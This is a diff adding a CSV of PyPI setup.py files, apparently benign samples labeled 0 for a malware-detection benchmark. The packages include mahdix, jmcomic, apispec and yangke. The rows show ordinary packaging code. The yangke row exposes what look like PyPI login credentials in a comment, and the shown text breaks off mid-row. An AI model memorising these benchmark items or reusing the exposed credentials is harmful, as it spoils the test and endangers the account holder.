@@ -1,0 +1,1953 @@
+sample_id,package_name,file_source,ecosystem,language,label,source,content_hash,content
+01afac2059e91f1ad907a32668121e52d6e8e814,mahdix-0.1.6.5,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/mahdix/0.1.6.5/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,97ae7bd09bc7258ad891d3ed4c74e4de0b43ba18,"from setuptools import setup, find_packages
+
+with open(""README.md"", ""r"", encoding=""utf-8"") as fh:
+    long_description = fh.read()
+
+setup(
+    name=""mahdix"",
+    version='0.1.6.5',
+    author=""Mahdi Hasan Shuvo"",
+    author_email=""shvo.mex@gmail.com"",
+    url=""https://www.facebook.com/bk4human"",
+    description=""An application that informs you of the different modules and very easy to use."",
+    long_description=long_description,
+    long_description_content_type=""text/markdown"",
+    packages=find_packages(),
+    classifiers=[
+        ""Programming Language :: Python :: 3"",
+        ""License :: OSI Approved :: MIT License"",
+        ""Operating System :: OS Independent"",
+    ],
+    install_requires=[""click"", ""pytz""],
+    entry_points={""console_scripts"": [""cloudquicklabs1 = src.main:main""]},
+    project_urls={
+        ""GitHub"": ""https://github.com/Shuvo-BBHH/"",
+        ""Bug Reports"": ""https://www.facebook.com/bk4human"",
+        ""Source"": ""https://github.com/Shuvo-BBHH/mahdix"",
+    },
+    keywords=""Shuvo-BBHH, MAHDI HASAN, Shuvo BBHH, Bk4kuman"",
+    license=""MIT"",
+    include_package_data=True,
+    zip_safe=False,
+    python_requires="">=3.11"",
+)"
+09946287b4261d57bdb42847282158c7fc616968,jmcomic-2.3.17,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/jmcomic/2.3.17/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,bec8bb84c79687251bcda9f055279e67f01ca15b,"from setuptools import setup, find_packages
+
+with open(""README.md"", encoding='utf-8') as f:
+    long_description = f.read()
+
+version = None
+with open('./src/jmcomic/__init__.py', encoding='utf-8') as f:
+    for line in f:
+        if '__version__' in line:
+            version = line[line.index(""'"") + 1: line.rindex(""'"")]
+            break
+
+if version is None:
+    print('Set version first!')
+    exit(1)
+
+setup(
+    name='jmcomic',
+    version=version,
+    description='Python API For JMComic (禁漫天堂)',
+    long_description_content_type=""text/markdown"",
+    long_description=long_description,
+    url='https://github.com/hect0x7/JMComic-Crawler-Python',
+    author='hect0x7',
+    author_email='93357912+hect0x7@users.noreply.github.com',
+    packages=find_packages(""src""),
+    package_dir={"""": ""src""},
+    python_requires="">=3.7"",
+    install_requires=[
+        'commonX>=0.6.2',
+        'curl_cffi',
+        'PyYAML',
+        'Pillow',
+    ],
+    keywords=['python', 'jmcomic', '18comic', '禁漫天堂', 'NSFW'],
+    classifiers=[
+        ""Development Status :: 4 - Beta"",
+        ""Intended Audience :: Developers"",
+        ""Programming Language :: Python :: 3.7"",
+        ""Programming Language :: Python :: 3.8"",
+        ""Programming Language :: Python :: 3.9"",
+        ""Programming Language :: Python :: 3.10"",
+        ""Programming Language :: Python :: 3.11"",
+        ""Operating System :: MacOS"",
+        ""Operating System :: POSIX :: Linux"",
+        ""Operating System :: Microsoft :: Windows"",
+    ],
+    entry_points={
+        'console_scripts': [
+            'jmcomic = jmcomic.cl:main'
+        ]
+    }
+)"
+10ce019d18d08a7551d993452f7545162f4117e9,p-template-generator-0.1.91,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/p-template-generator/0.1.91/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,f831d12a72a3640e34c80a0da8689dcb9cce7f01,"import setuptools
+
+with open(""README.md"", ""r"") as fh:
+    long_description = fh.read()
+setuptools.setup(
+    name=""p-template-generator"",
+    version=""0.1.91"",
+    author=""pengjun"",
+    author_email=""mr_lonely@foxmail.com"",
+    description=""temple tools"",
+    long_description=long_description,
+    long_description_content_type=""text/markdown"",
+    packages=setuptools.find_packages(),
+    classifiers=[
+        ""Programming Language :: Python :: 3"",
+        ""License :: OSI Approved :: MIT License"",
+        ""Operating System :: OS Independent"",
+    ],
+    py_modules=[],
+    install_requires=[
+        'requests',
+        'Image',
+        'protobuf',
+        'imagesize',
+        'urlparser',
+        'Pillow',
+        'mecord-cli>=0.4.10',
+        'p-template-res>=0.2.4',
+    ],
+    dependency_links=[],
+    entry_points={
+        'console_scripts':[
+            'template = template_generator.main:main'
+        ]
+    },
+    python_requires='>=3.7',
+)"
+3f0fe919fcf1994f1c51a274f658570fda7b411e,owega-4.8.1,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/owega/4.8.1/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,50f418d28c05f1cb74b38f8a285bc32d01ad270e,"#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+from setuptools import setup
+from owega.changelog import OwegaChangelog as oc
+
+
+desc = open('README.md').read()
+desc += '\n\n'
+desc += ""## CHANGELOG: ""
+desc += '\n```\n'
+desc += oc.log
+desc += '\n```\n'
+
+requirements = [
+	req.strip() for req in open('requirements.txt', 'r').read().split('\n')
+	if req.strip()
+]
+
+setup(
+	name='owega',
+	version='4.8.1',
+	packages=[
+		'owega',
+		'owega.changelog',
+		'owega.config',
+		'owega.OwegaFun',
+		'owega.conversation',
+	],
+	install_requires=requirements,
+	scripts=[
+		'scripts/owega',
+	],
+	long_description=desc,
+	long_description_content_type='text/markdown',
+	project_urls={
+		'Source': 'https://git.pyrokinesis.fr/darkgeem/owega',
+	},
+)"
+4bf4b8b6008b485c05f4f4dfdbbf64ecc1842f8a,mahdix-0.1.5.1,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/mahdix/0.1.5.1/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,0e5c0212e7247275f0374fb7e3e126e85e98845f,"from setuptools import setup
+setup(name='mahdix',
+version='0.1.5.1',
+description='this is a simple pip modul and test',
+long_description='''
+# pip install mahdix
+
+# ----[USE]-------
+
+# print Sumthiong = mahdix.p('YOUR TXT')
+
+GET NOW TIME = mahdix.time()
+
+# ----[GENERATE TXT LOGO] ------
+
+from mahdix import makelogo
+
+logo = makelogo(text='Mahdi')
+
+print(logo)
+
+
+#  random number
+
+GET 7 diges random number = mahdix.random7()
+
+GET 8 diges random number = mahdix.random8()
+
+GET 9 diges random number = mahdix.random9()
+
+GET 1 to2 diges random number = mahdix.random1_2()
+
+GET 1 to3 diges random number = mahdix.random1_3()
+
+GET 1 to4 diges random number = mahdix.random1_4()
+
+GET 10 diges random number = mahdix.random10()
+
+
+# -----[some functing]-------
+
+os.system = mahdix.sysT('YOUR COMmAND')
+
+request.get = mahdix.rqg   <Call this modul ""mahdix.rqg"">
+
+request.post = mahdix.rqp  <Call this modul ""mahdix.rqp"">
+
+random.randint = rr <Call this modul ""mahdix.rc"">
+
+random.choice = rc   <Call this modul ""mahdix.rc"">
+
+base64.decode = bsdc <Call this modul ""mahdix.bsdc"">
+
+base64.encode = bsec <Call this modul ""mahdix.bsec"">
+
+# ---[coloure]------
+
+RED = mahdix.RED
+
+GREEN = mahdix.GREEN
+
+YELLOW = mahdix.YELLOW
+
+BLUE=mahdix.BLUE
+
+ORANGE =mahdix.ORANGE
+
+LI_BLUE = Light_BLUE
+
+LI_MAGENTA = Light_MAGENTA
+
+LI_CYAN = Light_CYAN
+
+LI_WHITE = Light_WHITE
+
+Background colors
+
+BG_BLACK = Background_BLACK
+
+BG_RED = Background_RED
+
+BG_GREEN = Background_GREEN 
+
+# -----[MORE]-----
+
+GET id is create date fb = mahdix.getyearid(cid);# cid = '100000000023456'
+
+
+# ---- <<<There are more cloure are added>>------
+
+# You can use as fucntion your caoud make extra ordanary
+  
+# exp;
+  
+# import mahdix as M
+  
+# M.P('mahdi')
+  
+# if This modul is helpfull You can try it.... 
+  
+# Iam a little boy.plz Don't look down on me Try to Do somthing
+''',
+package=['mahdit','os','requests','base64','random','sys'],
+install_requires=[])"
+4d2d7a2ba2698af33fcca3db239b99d6146254dc,python-etcd-0.4.5,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/python-etcd/0.4.5/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,d9e2f5ddf61367cc86c0898acf2822ecacff790d,"from setuptools import setup, find_packages
+import sys, os
+
+here = os.path.abspath(os.path.dirname(__file__))
+README = open(os.path.join(here, 'README.rst')).read()
+NEWS = open(os.path.join(here, 'NEWS.txt')).read()
+
+
+version = '0.4.5'
+
+install_requires = [
+    'urllib3>=1.7.1',
+    'dnspython>=1.13.0'
+]
+
+test_requires = [
+    'mock',
+    'nose',
+    'pyOpenSSL>=0.14'
+]
+
+setup(
+    name='python-etcd',
+    version=version,
+    description=""A python client for etcd"",
+    long_description=README + '\n\n' + NEWS,
+    classifiers=[
+        ""Topic :: System :: Distributed Computing"",
+        ""Topic :: Software Development :: Libraries"",
+        ""License :: OSI Approved :: MIT License"",
+        ""Programming Language :: Python :: 2"",
+        ""Programming Language :: Python :: 3"",
+        ""Topic :: Database :: Front-Ends"",
+    ],
+    keywords='etcd raft distributed log api client',
+    author='Jose Plana',
+    author_email='jplana@gmail.com',
+    url='http://github.com/jplana/python-etcd',
+    license='MIT',
+    packages=find_packages('src'),
+    package_dir = {'': 'src'},
+    include_package_data=True,
+    zip_safe=False,
+    install_requires=install_requires,
+    tests_require=test_requires,
+    test_suite='nose.collector',
+)"
+67a43254c54687c9a85dba34617f63b354329b89,yangke-1.15.7,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/yangke/1.15.7/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,e666853226423126b4c9bc2d260f17ed6e7638ed,"import setuptools
+import os
+from gettext import gettext as _
+
+# 国际化：生成语言目录，需要确保相应目录已经创建
+# python setup.py extract_messages -k _ --output-file locale/main.pot   # 生成模板，会覆盖已经存在的模板
+# python setup.py init_catalog --domain main -l zh_CN -i locale/main.pot -d locale  # 生成po文件
+# python setup.py compile_catalog --domain main -l zh_CN -d locale  # 等同上一句
+
+# 发布wheel安装文件
+# python setup.py sdist bdist_wheel
+
+# ----------------------- 离线安装1 ------------------------------
+# 首先，离线安装最好保证离线计算机和在线计算机架构及软件版本尽量一致。
+# 1.安装anaconda,
+# 2.复制在线安装生成的conda环境至离线计算机
+# 3.win32api库需要运行Scripts\pywin32_postinstall.py，运行方式为：
+#   a) 切换到指定env环境，conda activate <python38>
+#   b) 运行脚本： python .\Scripts\pywin32_postinstall.py -install
+# 如果以上方法迁移后，运行python时出现错误：无法启动此程序，因为计算机中丢失api-ms-win-core-path-l1-1-0.dll尝试重新安装该程序以解决此问题。
+# 该错误可能是低版本的anaconda安装高版本的python导致的，如离线机器Anaconda3-2021.05上安装python3.9会出现该问题。
+# 解决方法：
+# 1.在联网计算机上安装python 3.8，命令如下：
+#   a) conda create --name=python38 python=3.8
+# 2.将安装的python3.8的虚拟环境复制到离线电脑上
+# 3.离线电脑试运行python3.8，如果不再报错，则继续安装以下额外第三方库
+# 4.pip download yangke[All] torch torchvision torchaudio tensorflow -d D:/whl
+# 5.将D:/whl文件夹复制到离线机器上。
+# 6.pip install --no-index --find-links=D:/whl yangke[All] torch torchvision torchaudio tensorflow
+# ----------------------- 离线安装1 ------------------------------
+
+# ----------------------- 离线安装2 ------------------------------
+# 1.在离线计算机中安装python3.9.12
+# 2.在联网机器上安装好所有包，开始在联网计算机上进行以下操作
+# 3.执行命令：pip freeze > require.txt，将安装包的信息保存到txt文件
+# 4.执行命令: pip wheel -w DIR -r require.txt
+# 5.执行命令: pip download -d DIR -r require.txt，如果生成的require.txt中yangke库是本地路径，则删除后面的路径
+# 6.将require.txt和dir目录拷贝到离线计算机中，以下为在离线计算机中的操作
+# 7.执行命令pip install --no-index --find-links=DIR -r require.txt
+# ----------------------- 离线安装2 ------------------------------
+
+# ----------------------- 上传pypi -----------------------------
+# twine upload dist/*
+# 输入账号密码即可
+# yangke08
+# YangKe.12
+# ----------------------- 上传pypi -----------------------------
+
+from yangke import __version__, extras_require
+
+yangke_version = __version__
+with open(os.path.join(os.path.dirname(__file__), 'README.md'), ""r"", encoding=""utf8"") as fh:
+    long_description = fh.read()
+
+install_requires = [  # 申明依赖包，安装包时pip会自动安装
+    'pandas>=1.3.0',
+    'pyyaml>=5.2',
+    'json5>=0.8.5',
+    'dill>=0.3.3',  # 储存函数对象
+    'babel>=2.9',
+    'pathlib2',
+    'pillow>=7.0.0',
+    # 'pywin32',  # 如果添加了pywin32依赖，则无法在linux系统上安装，因为依赖无法满足
+    'cmake',
+    'loguru',
+    'apscheduler',
+    'matplotlib>=3.5.0',
+    'openpyxl>3',
+    'pyKriging',
+    'opencv-python',
+    'psutil',
+    'markupsafe>=2.1.1',  # scrapy框架需要
+    'pyecharts',
+    'iapws>=1.5',
+    'qt_material',
+
+],
+
+all_lib = []
+for v in extras_require.values():
+    all_lib.extend(v)
+all_lib = list(set(all_lib))
+extras_require['All'] = all_lib
+extras_require['ugly'] = [  # 容易出错的包
+    'dlib>=19.17.0',  # dlib需要单独安装，涉及到cmake和boost
+    'torch>=1.4.0',  # pytorch需要单独安装，pypi里版本太老
+    'scikit_learn',  # 32位python中该库无法从源代码编译安装，需要下载whl文件安装
+    'scipy',  # 32位无法从源代码编译安装，需要下载whl文件安装
+    'PyQt6-WebEngine',  # 32位python无法安装该库
+    'pyWinhook>=1.6.2',  # 32位python无法编译安装，需要下载whl文件安装
+    'scikit-image>=0.19.3',  # paddleocr依赖
+    'lmdb>=1.3.0',  # paddleocr依赖
+    'orjson>3.7.3',  # paddleocr依赖
+]
+
+setuptools.setup(
+    name=""yangke"",  # 模块名
+    version=yangke_version,
+    packages=setuptools.find_packages(
+        exclude=['StockData', 'yangke..idea', 'yangke..git']),  # 这里输入Mod包文件目录
+    # scripts=[""sis_io.py""],
+    py_modules=[""main"",
+                # ""yangke/spider/stock10jqka/start_stock10jqka"",
+                # ""yangke\spider\stock10jqka\stock10jqka\spiders\jqka_spider"",
+                ],  # 打包的*.py文件
+
+    package_data={
+        """": [""*.py"", ""*.cfg"", ""*.js"", ""*.html"", ""*.ico""],
+    },
+    include_package_data=True,  # 将MANIFEST.in中的文件也打包进wheel文件中
+
+    python_requires="">=3.6"",
+
+    # metadata to display on PyPI
+    author=""杨可"",
+    author_email=""yangyangyangkekeke@qq.com"",
+    description=_(""个人工具综合平台，包含常用工具，网络爬虫，知识图谱，神经网络预测等工具""),
+    long_description=long_description,
+    long_description_content_type=""text/markdown"",
+    keywords=""yangke"",
+    url=""https://gitee.com/yangke02/lib4python"",
+    project_urls={
+        ""Bug Tracter"": ""https://gitee.com/yangke02/lib4python"",
+        ""Documentation"": ""https://gitee.com/yangke02/lib4python"",
+        ""Source Code"": ""https://gitee.com/yangke02/lib4python"",
+        ""Funding"": ""https://gitee.com/yangke02/lib4python"",
+    },
+    classifiers=[  # 给pip工具一些额外的元数据信息，只是用来给pypi提供搜索依据的，对实际项目不做任何限制
+        ""Development Status :: 4 - Beta"",
+        # Indicate who your project is intended for
+        ""Intended Audience :: Developers"",
+        ""Topic :: Software Development :: Build Tools"",
+
+        ""License :: Freely Distributable"",
+        ""Natural Language :: Chinese (Simplified)"",
+
+        ""Programming Language :: Python :: 3"",
+        ""Operating System :: Microsoft :: Windows"",
+    ],
+    install_requires=install_requires,
+    extras_require=extras_require,
+    message_extractors={
+        'yangke': [
+            ('**.py', 'python', None),
+            # ('**/templates/**.html', 'genshi', None),
+            # ('**/templates/**.txt', 'genshi', {'template_class': 'genshi.template:TextTemplate'})
+        ],
+    },
+)"
+82dc97bdd491bbd34da784318e02a4809d7cf2da,returnn-1.20231126.154000,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/returnn/1.20231126.154000/tar-gz/returnn/extern/WarpRna/warp-rna/tensorflow_binding/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,92cc7812dc551e362d886d91b73ae28bc9e15a81,"""""""setup.py script for warp-rna TensorFlow wrapper
+mostly copied from https://github.com/HawkAaron/warp-transducer/blob/master/tensorflow_binding/setup.py
+Original License: Apache License 2.0
+Changes are basically just adapted to the RNA code (and some formatting changes).
+""""""
+
+from __future__ import print_function
+
+import os
+import platform
+import re
+import warnings
+import setuptools
+import sys
+import unittest
+from setuptools.command.build_ext import build_ext as orig_build_ext
+from distutils.version import LooseVersion
+
+# We need to import tensorflow to find where its include directory is.
+try:
+    import tensorflow as tf
+except ImportError:
+    raise RuntimeError(""Tensorflow must be installed to build the tensorflow wrapper."")
+
+if ""CUDA_HOME"" not in os.environ:
+    print(""CUDA_HOME not found in the environment so building ""
+          ""without GPU support. To build with GPU support ""
+          ""please define the CUDA_HOME environment variable. ""
+          ""This should be a path which contains include/cuda.h"",
+          file=sys.stderr)
+    enable_gpu = False
+else:
+    enable_gpu = True
+
+if platform.system() == 'Darwin':
+    lib_ext = "".dylib""
+else:
+    lib_ext = "".so""
+
+warp_rna_path = ""../build""
+if ""WARP_RNA_PATH"" in os.environ:
+    warp_rna_path = os.environ[""WARP_RNA_PATH""]
+if not os.path.exists(os.path.join(warp_rna_path, ""libwarprna"" + lib_ext)):
+    print((""Could not find libwarprna.so in {}.\n""
+           ""Build warp-rna and set WARP_RNA_PATH to the location of""
+           "" libwarprna.so (default is '../build')"").format(warp_rna_path),
+          file=sys.stderr)
+    sys.exit(1)
+
+root_path = os.path.realpath(os.path.dirname(__file__))
+
+tf_include = tf.sysconfig.get_include()
+tf_src_dir = tf.sysconfig.get_lib()
+tf_includes = [tf_include, tf_src_dir]
+include_dirs = tf_includes + [os.path.join(root_path, '../include')]
+
+if LooseVersion(tf.__version__) >= LooseVersion('1.4'):
+    nsync_dir = '../../external/nsync/public'
+    if LooseVersion(tf.__version__) >= LooseVersion('1.10'):
+        nsync_dir = 'external/nsync/public'
+    include_dirs += [os.path.join(tf_include, nsync_dir)]
+
+if os.getenv(""TF_CXX11_ABI"") is not None:
+    TF_CXX11_ABI = os.getenv(""TF_CXX11_ABI"")
+else:
+    warnings.warn(""Assuming tensorflow was compiled without C++11 ABI. ""
+                  ""It is generally true if you are using binary pip package. ""
+                  ""If you compiled tensorflow from source with gcc >= 5 and didn't set ""
+                  ""-D_GLIBCXX_USE_CXX11_ABI=0 during compilation, you need to set ""
+                  ""environment variable TF_CXX11_ABI=1 when compiling this bindings. ""
+                  ""Also be sure to touch some files in src to trigger recompilation. ""
+                  ""Also, you need to set (or unsed) this environment variable if getting ""
+                  ""undefined symbol: _ZN10tensorflow... errors"")
+    TF_CXX11_ABI = ""0""
+
+extra_compile_args = ['-std=c++11', '-fPIC', '-D_GLIBCXX_USE_CXX11_ABI=' + TF_CXX11_ABI]
+# current tensorflow code triggers return type errors, silence those for now
+extra_compile_args += ['-Wno-return-type']
+if LooseVersion(tf.__version__) >= LooseVersion('1.4'):
+    extra_compile_args += tf.sysconfig.get_compile_flags()
+
+extra_link_args = []
+if LooseVersion(tf.__version__) >= LooseVersion('1.4'):
+    extra_link_args += tf.sysconfig.get_link_flags()
+
+if (enable_gpu):
+    extra_compile_args += ['-DWARPRNA_ENABLE_GPU']
+    include_dirs += [os.path.join(os.environ[""CUDA_HOME""], 'include')]
+
+    # mimic tensorflow cuda include setup so that their include command work
+    if not os.path.exists(os.path.join(root_path, ""include"")):
+        os.mkdir(os.path.join(root_path, ""include""))
+
+    cuda_inc_path = os.path.join(root_path, ""include/cuda"")
+    if not os.path.exists(cuda_inc_path) or os.readlink(cuda_inc_path) != os.environ[""CUDA_HOME""]:
+        if os.path.exists(cuda_inc_path):
+            os.remove(cuda_inc_path)
+        os.symlink(os.environ[""CUDA_HOME""], cuda_inc_path)
+    include_dirs += [os.path.join(root_path, 'include')]
+
+# Ensure that all expected files and directories exist.
+for loc in include_dirs:
+    if not os.path.exists(loc):
+        print((""Could not find file or directory {}.\n""
+               ""Check your environment variables and paths?"").format(loc),
+              file=sys.stderr)
+        sys.exit(1)
+
+lib_srcs = ['src/warp_rna_op.cc']
+
+ext = setuptools.Extension('warprna_tensorflow.kernels',
+                           sources = lib_srcs,
+                           language = 'c++',
+                           include_dirs = include_dirs,
+                           library_dirs = [warp_rna_path],
+                           runtime_library_dirs = [os.path.realpath(warp_rna_path)],
+                           libraries = ['warp_rna'],
+                           extra_compile_args = extra_compile_args,
+                           extra_link_args = extra_link_args)
+
+class build_tf_ext(orig_build_ext):
+    def build_extensions(self):
+        if LooseVersion(tf.__version__) < LooseVersion('1.4'):
+            self.compiler.compiler_so.remove('-Wstrict-prototypes')
+        orig_build_ext.build_extensions(self)
+
+def discover_test_suite():
+    test_loader = unittest.TestLoader()
+    test_suite = test_loader.discover('tests', pattern='test_*.py')
+    return test_suite
+
+# Read the README.md file for the long description. This lets us avoid
+# duplicating the package description in multiple places in the source.
+README_PATH = os.path.join(os.path.dirname(__file__), ""README.md"")
+with open(README_PATH, ""r"") as handle:
+    # Extract everything between the first set of ## headlines
+    LONG_DESCRIPTION = re.search(""#.*([^#]*)##"", handle.read()).group(1).strip()
+
+setuptools.setup(
+    name = ""warp_rna"",
+    version = ""0.1"",
+    description = ""TensorFlow wrapper for warp-rna"",
+    url=""https://github.com/1ytic/warp-rna"",
+    long_description = LONG_DESCRIPTION,
+    author = ""Mingkun Huang"",
+    author_email = ""mingkunhuang95@gmail.com"",
+    license = ""Apache"",
+    packages = [""warp_rna""],
+    ext_modules = [ext],
+    cmdclass = {'build_ext': build_tf_ext},
+    test_suite = 'setup.discover_test_suite',
+)"
+8fca89cdb3d4e4701e82c99e7ddcf6bdbfdcebdb,lxml2pandas-0.16,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/lxml2pandas/0.16/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,b266c525458f9410b565d357c8f26e3b4f029377,"from setuptools import setup, find_packages
+import codecs
+import os
+# 
+here = os.path.abspath(os.path.dirname(__file__))
+# 
+with open(os.path.join(os.path.abspath(os.path.dirname(__file__)),'README.md'), encoding=""utf-8"") as fh:
+    long_description = ""\n"" + fh.read()\
+
+from pathlib import Path
+this_directory = Path(__file__).parent
+#long_description = (this_directory / ""README.md"").read_text()
+
+VERSION = '''0.16'''
+DESCRIPTION = '''lxml to pandas for fast web scraping'''
+
+# Setting up
+setup(
+    name=""lxml2pandas"",
+    version=VERSION,
+    license='MIT',
+    url = 'https://github.com/hansalemaos/lxml2pandas',
+    author=""Johannes Fischer"",
+    author_email=""aulasparticularesdealemaosp@gmail.com"",
+    description=DESCRIPTION,
+long_description = long_description,
+long_description_content_type=""text/markdown"",
+    #packages=['a_pandas_ex_apply_ignore_exceptions', 'fake_headers', 'flatten_everything', 'lxml', 'multiprocnomain', 'numpy', 'pandas', 'requests'],
+    keywords=['lxml', 'pandas', 'web scraping'],
+    classifiers=['Development Status :: 4 - Beta', 'Programming Language :: Python :: 3 :: Only', 'Programming Language :: Python :: 3.10', 'Topic :: Software Development :: Libraries :: Python Modules', 'Topic :: Utilities'],
+    install_requires=['a_pandas_ex_apply_ignore_exceptions', 'fake_headers', 'flatten_everything', 'lxml', 'multiprocnomain', 'numpy', 'pandas', 'requests'],
+    include_package_data=True
+)
+#python setup.py sdist bdist_wheel
+#twine upload dist/*"
+930e80949223e39363a1f36504e675ead4c9334c,chainforge-0.2.6.7,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/chainforge/0.2.6.7/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,c2108de25a16805cd07aadb30b70f3f14fb6eb90,"from setuptools import setup, find_packages
+
+def readme():
+    with open('README.md', encoding='utf-8') as f:
+        return f.read()
+
+setup(
+    name='chainforge',
+    version='0.2.6.7',
+    packages=find_packages(),
+    author=""Ian Arawjo"",
+    description=""A Visual Programming Environment for Prompt Engineering"",
+    long_description=readme(),
+    long_description_content_type='text/markdown',
+    keywords='prompt engineering LLM response evaluation',
+    license=""MIT"",
+    url=""https://github.com/ianarawjo/ChainForge/"",
+    install_requires=[
+        # Package dependencies
+        ""flask>=2.2.3"",
+        ""flask[async]"",
+        ""flask_cors"",
+        ""requests"",
+        ""urllib3==1.26.6"",
+        ""openai"",
+        ""anthropic"",
+        ""google-generativeai"",
+        ""dalaipy>=2.0.2"",
+        ""mistune>=2.0"",  # for LLM response markdown parsing
+    ],
+    entry_points={
+        'console_scripts': [
+            'chainforge = chainforge.app:main',
+        ],
+    },
+    classifiers=[
+        # Package classifiers
+        'Development Status :: 3 - Alpha',
+        'Intended Audience :: Developers',
+        'License :: OSI Approved :: MIT License',
+        'Programming Language :: Python :: 3',
+        'Programming Language :: Python :: 3.8',
+        'Programming Language :: Python :: 3.9',
+        'Programming Language :: Python :: 3.10',
+    ],
+    python_requires="">=3.8"",
+    include_package_data=True,
+)"
+a33d751cfda92f9411842472ca805a790cea1cce,apispec-6.3.0,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/apispec/6.3.0/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,6cac23e8fd64a7471ffb23f6128ec9050bfe57b6,"import re
+from setuptools import setup, find_packages
+
+INSTALL_REQUIRES = ""packaging>=21.3""
+
+EXTRAS_REQUIRE = {
+    ""marshmallow"": [""marshmallow>=3.18.0""],
+    ""yaml"": [""PyYAML>=3.10""],
+    ""validation"": [""prance[osv]>=0.11"", ""openapi_spec_validator<0.5""],
+    ""lint"": [
+        ""flake8==5.0.4"",
+        ""flake8-bugbear==22.9.23"",
+        ""pre-commit~=2.4"",
+        ""mypy==0.982"",
+        ""types-PyYAML"",
+    ],
+    ""docs"": [
+        ""marshmallow>=3.13.0"",
+        ""pyyaml==6.0"",
+        ""sphinx==5.2.3"",
+        ""sphinx-issues==3.0.1"",
+        ""sphinx-rtd-theme==1.0.0"",
+    ],
+}
+EXTRAS_REQUIRE[""tests""] = (
+    EXTRAS_REQUIRE[""yaml""]
+    + EXTRAS_REQUIRE[""validation""]
+    + [""marshmallow>=3.13.0"", ""pytest""]
+)
+EXTRAS_REQUIRE[""dev""] = EXTRAS_REQUIRE[""tests""] + EXTRAS_REQUIRE[""lint""] + [""tox""]
+
+
+def find_version(fname):
+    """"""Attempts to find the version number in the file names fname.
+    Raises RuntimeError if not found.
+    """"""
+    version = """"
+    with open(fname) as fp:
+        reg = re.compile(r'__version__ = [\'""]([^\'""]*)[\'""]')
+        for line in fp:
+            m = reg.match(line)
+            if m:
+                version = m.group(1)
+                break
+    if not version:
+        raise RuntimeError(""Cannot find version information."")
+    return version
+
+
+def read(fname):
+    with open(fname) as fp:
+        content = fp.read()
+    return content
+
+
+setup(
+    name=""apispec"",
+    version=find_version(""src/apispec/__init__.py""),
+    description=""A pluggable API specification generator. Currently supports the ""
+    ""OpenAPI Specification (f.k.a. the Swagger specification)."",
+    long_description=read(""README.rst""),
+    author=""Steven Loria"",
+    author_email=""sloria1@gmail.com"",
+    url=""https://github.com/marshmallow-code/apispec"",
+    packages=find_packages(""src""),
+    package_dir={"""": ""src""},
+    include_package_data=True,
+    install_requires=INSTALL_REQUIRES,
+    extras_require=EXTRAS_REQUIRE,
+    license=""MIT"",
+    zip_safe=False,
+    keywords=""apispec swagger openapi specification oas documentation spec rest api"",
+    python_requires="">=3.7"",
+    classifiers=[
+        ""License :: OSI Approved :: MIT License"",
+        ""Programming Language :: Python :: 3"",
+        ""Programming Language :: Python :: 3.7"",
+        ""Programming Language :: Python :: 3.8"",
+        ""Programming Language :: Python :: 3.9"",
+        ""Programming Language :: Python :: 3.10"",
+        ""Programming Language :: Python :: 3.11"",
+        ""Programming Language :: Python :: 3 :: Only"",
+    ],
+    test_suite=""tests"",
+    project_urls={
+        ""Funding"": ""https://opencollective.com/marshmallow"",
+        ""Issues"": ""https://github.com/marshmallow-code/apispec/issues"",
+        ""Tidelift"": ""https://tidelift.com/subscription/pkg/pypi-apispec?utm_source=pypi-apispec&utm_medium=pypi"",  # noqa: B950,E501
+    },
+)"
+bc4ddb002bb3348d40caf59da0955ae768d3b789,siman-1.4.7,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/siman/1.4.7/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,68f6474022fd2b0c0e61c7804781e65ef7b50e96,"import setuptools, os
+
+with open(""README.md"", ""r"") as fh:
+    long_description = fh.read()
+
+setuptools.setup(
+    name=""siman"",
+    version=""1.4.7"",
+    author=""Dmitry Aksenov"",
+    author_email=""dimonaks@gmail.com"",
+    description=""Manager for DFT calculations"",
+    long_description=long_description,
+    long_description_content_type=""text/markdown"",
+    url=""https://github.com/dimonaks/siman"",
+    license = 'GPL',
+    keywords='DFT VASP Density Functional Theory NEB DFT+U PAW GGA Monte-Carlo',
+    # package_dir={'':'siman'},
+    packages=setuptools.find_packages(),
+    # packages=['siman'],
+    # data_files=[(os.path.expanduser(""~""), ['siman/simanrc.py'])],
+    install_requires=['numpy', 'tabulate', 'pymatgen', 'pandas', 'scipy', 'six', 'matplotlib', 'ase', 'paramiko', 'adjustText'],
+    classifiers=[
+        ""Programming Language :: Python :: 3"",
+        ""License :: OSI Approved :: GNU General Public License (GPL)"",
+        ""Operating System :: OS Independent"",
+    ],
+)"
+c6544d907b7733ba74a80b6bb44dc6d17199970d,renderg-sdk-0.1.11,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/renderg-sdk/0.1.11/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,81b2db2dc3681342e52806dc5f07cf0e734d810d,"from os import path
+
+from setuptools import setup, find_packages
+
+
+def get_readme():
+    this_directory = path.abspath(path.dirname(__file__))
+    with open(path.join(this_directory, 'README.md'), encoding='utf-8') as f:
+        long_description = f.read()
